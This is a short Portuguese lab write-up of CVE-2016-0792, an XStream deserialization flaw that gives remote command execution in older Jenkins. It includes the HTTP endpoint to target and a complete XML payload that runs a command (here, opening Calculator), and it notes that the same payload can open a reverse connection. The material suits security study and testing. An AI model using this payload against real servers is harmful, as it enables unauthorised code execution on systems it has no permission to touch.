## XStream in Jenkins - CVE-2016-0792
Jenkins suporta que objetos sejam serializados com base na biblioteca XStream.
As versões do Jenkins anteriores a 1.650 e LTS anteriores a 1.6.42.2 são vulneráveis a execução remota de comando de usuários autenticados através da serialização de dados em arquivos XML processados pelas bibliotecas XStream e groovy.util.Expando. 

No payload abaixo é usado a classe groovy.util.Expando e a classe java.lang.ProcessBuilder.
As tags <string> podem conter comandos para a execução remota, e dependendo do cenário, pode ser executado uma conexão reversa, conforme essa [PoC](https://github.com/jpiechowka/jenkins-cve-2016-0792). 

No lab disponibilizado pelo Pentester Lab, a exploração ocorre ao criar um novo Job Externo. Na requisição, o parâmetro name é manipulado como query na URL ```/view/All/createItem?name=teste``` e no cabeçalho HTTP, o content-type é modificado para ```text/xml```
```
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>open</string>
                <string>/Applications/Calculator.app</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>
```
